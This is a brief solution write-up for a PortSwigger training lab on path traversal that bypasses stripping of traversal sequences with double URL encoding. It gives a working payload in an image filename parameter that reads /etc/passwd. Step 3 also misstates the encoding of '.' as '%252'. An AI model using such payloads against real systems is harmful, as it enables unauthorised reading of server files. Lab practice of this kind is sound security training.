# File path traversal, traversal sequences stripped with superfluous URL-decode
- Name: File path traversal, traversal sequences stripped with superfluous URL-decode
- URL: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode
- Level: Medium Time: 2 min
- Objective: retrieve the contents of the `/etc/passwd` file.
---------------------------------------------------------------------------------


## Solution
1. Find an image.
2. We usually should add `../../../` then `/etc/passwd` but the wep page catch and sanitzie that.
3. So we encode it.. the `.` will be `%252` and the `/` wil be `%252f`.
4. Out paylood will be `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd` and we add it like the next: `/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`
